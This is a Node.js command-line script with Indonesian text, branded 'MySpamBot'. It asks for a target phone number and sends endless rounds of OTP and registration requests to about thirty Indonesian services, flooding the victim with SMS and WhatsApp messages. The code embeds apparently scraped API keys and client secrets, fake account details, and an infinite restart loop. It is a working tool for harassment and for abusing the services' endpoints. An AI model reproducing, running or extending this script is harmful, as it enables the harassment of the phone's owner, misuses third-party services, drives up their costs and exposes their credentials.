#!/usr/bin/env node
'use strict';

const readline = require('readline');
const axios    = require('axios');

// ═══════════════════════════════════════════════════════
// WARNA TERMINAL
// ═══════════════════════════════════════════════════════
const hijau  = '\x1b[1;92m';
const putih  = '\x1b[1;97m';
const abu    = '\x1b[1;90m';
const kuning = '\x1b[1;93m';
const ungu   = '\x1b[1;95m';
const merah  = '\x1b[1;91m';
const biru   = '\x1b[1;96m';
const reset  = '\x1b[0m';

// ═══════════════════════════════════════════════════════
// AUTO-KETIK — efek karakter per karakter
// ═══════════════════════════════════════════════════════
function autoketik(s) {
    return new Promise((resolve) => {
        const chars = (s + '\n').split('');
        let i = 0;
        const tick = () => {
            if (i >= chars.length) return resolve();
            process.stdout.write(chars[i]);
            i++;
            setTimeout(tick, 50);
        };
        tick();
    });
}

// ═══════════════════════════════════════════════════════
// COUNTDOWN — 120 detik default, tampil HH:MM:SS
// ═══════════════════════════════════════════════════════
function countdown(seconds) {
    return new Promise((resolve) => {
        let remaining = seconds;
        const tick = () => {
            if (remaining <= 0) {
                process.stdout.write('\n');
                return resolve();
            }
            const mins = String(Math.floor(remaining / 60)).padStart(2, '0');
            const secs = String(remaining % 60).padStart(2, '0');

            const now  = new Date();
            const hari = ['Minggu','Senin','Selasa','Rabu','Kamis',"Jum'at",'Sabtu'][now.getDay()];
            const bln  = ['Januari','Februari','Maret','April','Mei','Juni','Juli','Agustus','September','Oktober','November','Desember'][now.getMonth()];
            const tgl  = String(now.getDate()).padStart(2, '0');
            const thn  = now.getFullYear();
            const jam  = now.toTimeString().slice(0, 8);

            const line = `[•] Silakan Menunggu Dalam Waktu ${hijau}${mins}:${secs} | ${biru}${hari}, ${tgl} ${bln} ${thn} | ${kuning}Waktu ${jam}`;
            process.stdout.write('\r' + line + '   ');
            remaining--;
            setTimeout(tick, 1000);
        };
        tick();
    });
}

// ═══════════════════════════════════════════════════════
// PROMPT — baca input user
// ═══════════════════════════════════════════════════════
function prompt(question) {
    const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
    return new Promise((resolve) => rl.question(question, (answer) => {
        rl.close();
        resolve(answer);
    }));
}

// ═══════════════════════════════════════════════════════
// RANDOM INTEGER — pengganti random.randrange()
// ═══════════════════════════════════════════════════════
function randRange(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

// ═══════════════════════════════════════════════════════
// HTTP CLIENT — axios dengan timeout supaya gak hang
// ═══════════════════════════════════════════════════════
const http = axios.create({
    timeout: 15000,
    validateStatus: () => true,        // jangan throw di status != 2xx
    maxRedirects: 5,
    headers: { 'User-Agent': 'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36' }
});

// ═══════════════════════════════════════════════════════
// SEMUA ENDPOINT — dibungkus satu fungsi besar
// ═══════════════════════════════════════════════════════
async function spamAll(nomor) {
    const b = nomor.slice(1);       // 89508... (tanpa 0)
    const c = '62' + b;             // 6289508...

    // Helper — jalanin promise, jangan sampai bikin proses mati
    const fire = (label, promise) => {
        promise.catch(() => {});
    };

    // ─── GRUP 1: endpoint utama ────────────────────────
    fire('Ktbs',
        http.get(`https://core.ktbs.io/v2/user/registration/otp/${nomor}`));

    fire('Klikwa',
        http.post('https://api.klikwa.net/v1/number/sendotp',
            JSON.stringify({ number: '+62' + b }),
            { headers: { 'Authorization': 'Basic QjMzOkZSMzM=', 'Content-Type': 'application/json' } }));

    fire('Payfazz',
        http.post('https://api.payfazz.com/v2/phoneVerifications',
            new URLSearchParams({ phone: '0' + nomor }).toString(),
            { headers: { 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8' } }));

    fire('SecuredAPI',
        http.post(`https://securedapi.confirmtkt.com/api/platform/register?mobileNumber=${nomor}`));

    fire('Matahari',
        http.post('https://www.matahari.com/rest/V1/thorCustomers/registration-resend-otp',
            JSON.stringify({ otp_request: { mobile_number: nomor, mobile_country_code: '+62' } }),
            { headers: { 'Content-Type': 'application/json' } }));

    fire('Battlefront',
        http.post('https://battlefront.danacepat.com/v1/auth/common/phone/send-code',
            new URLSearchParams({ mobile_no: b }).toString(),
            { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }));

    fire('Pinjamindo',
        http.get(`https://appapi.pinjamindo.co.id/api/v1/custom/send_verify_code?mobile=62${b}&af_id=1603255661130-6766273395770306663&app=pinjamindo&b=vivo&c=GooglePlay&gaid=bce68810-4f8a-4675-9452-e0d8565c9a50&instance_id=eEARw8yXQImtIANt3oU0zh&is_root=0&l=in&m=vivo+1902&os=android&r=9&sdk=28&simulator=0&t=1432349188&v=10011&sign=46565D573B5BB08099A60A3414F265550092E215`));

    fire('Jumpstart',
        http.post('https://api.jumpstart.id/graphql',
            JSON.stringify({
                operationName: 'CheckPhoneNoAndGenerateOtpIfNotExist',
                variables: { phoneNo: '+62' + b },
                query: 'query CheckPhoneNoAndGenerateOtpIfNotExist($phoneNo: String!) {\n  checkPhoneNoAndGenerateOtpIfNotExist(phoneNo: $phoneNo)\n}\n'
            }),
            { headers: { 'Content-Type': 'application/json' } }));

    fire('Asani',
        http.post('https://api.asani.co.id/api/v1/send-otp',
            JSON.stringify({ phone: '62' + b, email: 'akuntesnuyul@gmail.com' }),
            { headers: { 'Content-Type': 'application/json' } }));

    fire('Depop',
        http.put('https://webapi.depop.com/api/auth/v1/verify/phone',
            JSON.stringify({ phone_number: nomor, country_code: 'ID' }),
            { headers: { 'Content-Type': 'application/json' } }));

    fire('Indo',
        http.get(`https://account-api-v1.klikindomaret.com/api/PreRegistration/SendOTPSMS?NoHP=${nomor}`));

    fire('Wa2',
        http.post('https://qtva.id/page/frames.php?f=eVBDUVU0NE1DTStQTmgvallDaTA0QT09&p=RUtYZFBydUdXTmVWMUtnc3M1ZmtnVFpMSXRxTWlvQUduaTR6VFZzRk00UT0=&hc=bmFSencyM2FmUWxmckV4Y0pXdEVOQ1pYZW5pY0pXSlBENHZSaCtJNmtTSnR0SHJWeEJaOUhWZHVSUHpRcXhWTg==',
            new URLSearchParams({
                namaDepan: 'Tahalu' + randRange(11, 99999),
                emailNope: nomor,
                password: 'Indo' + randRange(111, 999),
                konfirmasiPass: 'Indo' + randRange(111, 999)
            }).toString(),
            { headers: { 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8' } }));

    fire('Icq',
        http.post('https://u.icq.net/api/v14/rapi/auth/sendCode',
            JSON.stringify({
                reqId: '64708-1593781791',
                params: { phone: c, language: 'en-US', route: 'sms', devId: 'ic1rtwz1s1Hj1O0r', application: 'icq' }
            }),
            { headers: { 'Content-Type': 'application/json', 'Origin': 'http://web.icq.com' } }));

    fire('Cairin',
        http.post('https://app.cairin.id/v1/app/sms/sendCaptcha',
            new URLSearchParams({
                haveImageCode: '0',
                fileName: '6f8c3b90c845f09ff1bfe714a30aede8',
                phone: nomor,
                imageCode: '',
                userImei: '',
                type: 'registry'
            }).toString(),
            { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }));

    fire('Cmsapi_mapclub',
        http.post('https://cmsapi.mapclub.com/api/signup-otp',
            new URLSearchParams({ phone: nomor }).toString(),
            { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }));

    fire('Bukuwarung',
        http.post('https://api-v2.bukuwarung.com/api/v2/auth/otp/send',
            JSON.stringify({
                action: 'LOGIN_OTP',
                countryCode: '+62',
                deviceId: 'test-1',
                method: 'WA',
                phone: nomor,
                clientId: '2e3570c6-317e-4524-b284-980e5a4335b6',
                clientSecret: 'S81VsdrwNUN23YARAL54MFjB2JSV2TLn'
            }),
            { headers: { 'Content-Type': 'application/json', 'buku-origin': 'tokoko-web' } }));

    fire('Beryllium_mapclub',
        http.post('https://beryllium.mapclub.com/api/member/registration/sms/otp',
            JSON.stringify({ account: nomor }),
            { headers: { 'Content-Type': 'application/json' } }));

    fire('Danacita',
        http.get(`https://api.danacita.co.id/users/send_otp/?mobile_phone=${nomor}`));

    fire('Kredito',
        http.post('https://app-api.kredito.id/client/v1/common/verify-code/send',
            JSON.stringify({ event: 'default_verification', mobilePhone: b, sender: 'jatissms' }),
            { headers: { 'Content-Type': 'application/json; charset=UTF-8' } }));

    fire('Maucash',
        http.get(`https://japi.maucash.id/welab-user/api/v1/send-sms-code?mobile=${b}&channelType=0`));

    fire('Gojek',
        http.post('https://api.gojekapi.com/v5/customers',
            JSON.stringify({
                email: 'nsjwwiwiwisnsnn12@gmail.com',
                name: 'akuinginterbang12',
                phone: c,
                signed_up_country: 'ID'
            }),
            { headers: { 'Content-Type': 'application/json' } }));

    fire('Harvestcake',
        http.post('https://harvestcakes.com/register',
            new URLSearchParams({ phone: b }).toString(),
            { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }));

    fire('Oyo',
        http.post('https://identity-gateway.oyorooms.com/identity/api/v1/otp/generate_by_phone?locale=id',
            JSON.stringify({
                phone: b,
                country_code: '+62',
                country_iso_code: 'ID',
                nod: '4',
                send_otp: 'true',
                devise_role: 'Consumer_Guest'
            }),
            { headers: { 'Content-Type': 'application/json' } }));

    fire('Foa',
        http.post('https://foreignadmits.com/api/register-otp-generate-student',
            new URLSearchParams({ mobile: `62${nomor.slice(1)}`, countryCode: '+62' }).toString(),
            { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }));

    fire('Sayurbox_wa',
        http.post('https://www.sayurbox.com/graphql/v1?deduplicate=1',
            JSON.stringify({
                operationName: 'generateOTP',
                variables: { destinationType: 'whatsapp', identity: '+62' + nomor },
                query: 'mutation generateOTP($destinationType: String!, $identity: String!) {\n  generateOTP(destinationType: $destinationType, identity: $identity) {\n    id\n    __typename\n  }\n}'
            }),
            { headers: { 'Content-Type': 'application/json', 'x-sbox-tenant': 'sayurbox', 'x-binary-version': '2.2.1' } }));

    fire('Tokko_wa',
        http.post('https://api.tokko.io/graphql',
            JSON.stringify({
                operationName: 'generateOTP',
                variables: {
                    generateOtpInput: {
                        phoneNumber: '+62' + nomor,
                        hashCode: '',
                        channel: 'WHATSAPP',
                        userType: 'MERCHANT'
                    }
                },
                query: 'mutation generateOTP($generateOtpInput: GenerateOtpInput!) {\n  generateOtp(generateOtpInput: $generateOtpInput) {\n    phoneNumber\n  }\n}\n'
            }),
            { headers: { 'Content-Type': 'application/json', 'x-tokko-api-client': 'merchant_web' } }));

    fire('Carsome_wa',
        http.post('https://www.carsome.id/website/login/sendSMS',
            JSON.stringify({ username: nomor, optType: 1 }),
            { headers: { 'Content-Type': 'application/json' } }));

    fire('Jenius',
        http.post('https://api.btpn.com/jenius',
            JSON.stringify({
                query: 'mutation registerPhone($phone: String!,$language: Language!) {\n  registerPhone(input: {phone: $phone,language: $language}) {\n    authId\n    tokenId\n    __typename\n  }\n}\n',
                variables: { phone: '+62' + nomor, language: 'id' },
                operationName: 'registerPhone'
            }),
            { headers: { 'Content-Type': 'application/json', 'btpn-apikey': 'f73eb34d-5bf3-42c5-b76e-271448c2e87d' } }));

    fire('Alodokter',
        http.post('https://www.alodokter.com/login-with-phone-number',
            JSON.stringify({ user: { phone: '0' + nomor } }),
            { headers: { 'Content-Type': 'application/json' } }));

    fire('Pizzahut',
        http.post('https://api-prod.pizzahut.co.id/customer/v1/customer/register',
            JSON.stringify({
                email: 'aldigg088@gmail.com',
                first_name: 'Xenzi',
                last_name: 'Wokwokw',
                password: 'Aldi++/67',
                phone: '0' + nomor,
                birthday: '2000-01-02'
            }),
            { headers: { 'Content-Type': 'application/json', 'x-platform': 'WEBMOBILE' } }));

    fire('Misteraladin',
        http.post('https://m.misteraladin.com/api/members/v2/otp/request',
            JSON.stringify({
                phone_number_country_code: '62',
                phone_number: nomor,
                type: 'register'
            }),
            { headers: { 'Content-Type': 'application/json', 'x-platform': 'mobile-web' } }));

    // ─── GRUP 2: endpoint legacy yang gue pertahanin ────
    // (kalau lo mau uncomment yang di Python, tinggal copas pattern di atas)

    return true;
}

// ═══════════════════════════════════════════════════════
// TANYA — setelah sukses, user mau ulang?
// ═══════════════════════════════════════════════════════
async function tanya(nomor) {
    while (true) {
        const a = await prompt(`${merah}Apakah Anda ingin mengulangi Spam Tools? y/t \n${putih}Input Anda: ${hijau}`);
        if (a === 'y' || a === 'Y') {
            await start(nomor, 1);
            return;
        } else if (a === 't' || a === 'T') {
            await autoketik(`${hijau}Berhasil Keluar Dari Tools`);
            process.exit(0);
        } else {
            console.log('Masukkan Pilihan Dengan Benar');
        }
    }
}

// ═══════════════════════════════════════════════════════
// JAM — loop utama, 10 iterasi per siklus
// ═══════════════════════════════════════════════════════
async function jam(nomor) {
    await autoketik('Program Berjalan!');

    for (let i = 0; i < 10; i++) {
        try {
            await spamAll(nomor);
            await autoketik(`${hijau}Sukses Mengirim Spam`);
            await countdown(120);
        } catch (err) {
            // Node gak perlu except besar-besaran — axios udah pakai validateStatus.
            // Ini cuma jaring terakhir kalau ada yang lolos.
            console.log('');
            await autoketik('--Request Time Out--');
            console.log(`${putih}Proses Automatis dialihkan ke Requests Alternatif${hijau}`);
            await autoketik(`${hijau}Sukses Mengirim Spam`);
            await countdown(120);
        }
    }

    // Siklus selesai → ulang dari awal
    await autoketik('--reboot wait 20 second--');
    await new Promise((r) => setTimeout(r, 15000));
    console.clear();
    await autoketik(`${merah}Mengulang Spam ke Nomor : ${nomor}.....${hijau}`);
    return start(nomor, 1);
}

// ═══════════════════════════════════════════════════════
// START — entry point siklus
// ═══════════════════════════════════════════════════════
async function start(nomor, x) {
    if (x === 0) {
        console.clear();
        await autoketik(`${merah}Infinite Loop Spam to ${putih}${nomor} ${merah}is ${hijau}Ready!`);
        return jam(nomor);
    } else {
        console.log('');
        await autoketik('--reboot wait 20 second--');
        await new Promise((r) => setTimeout(r, 15000));
        console.clear();
        await autoketik(`${merah}Mengulang Spam ke Nomor : ${nomor}.....${hijau}`);
        return jam(nomor);
    }
}

// ═══════════════════════════════════════════════════════
// MAIN
// ═══════════════════════════════════════════════════════
async function main() {
    console.clear();
    await autoketik(`Selamat datang di ${merah}MySpamBot`);
    console.log(`${kuning}Author      : ${hijau}Ricky Khairul Faza`);
    console.log(`${kuning}Github      : ${merah}github.com/rickyfazaa`);
    console.log(`${kuning}Instagram   : ${biru}instagram.com/rickyfazaa`);

    const nomor = (await prompt(`${hijau}Masukkan Nomor Target: ${putih}`)).trim();
    if (!nomor) {
        console.log(`${merah}Nomor tidak boleh kosong.${reset}`);
        process.exit(1);
    }
    await start(nomor, 0);
}

// ═══════════════════════════════════════════════════════
// RUNNER
// ═══════════════════════════════════════════════════════
main().catch((err) => {
    console.error(`${merah}Fatal error:${reset}`, err.message);
    process.exit(1);
});

// Ctrl+C handler
process.on('SIGINT', async () => {
    await autoketik(`${merah}Batal\n${hijau}--Keluar Dari Tools--`);
    process.exit(0);
});
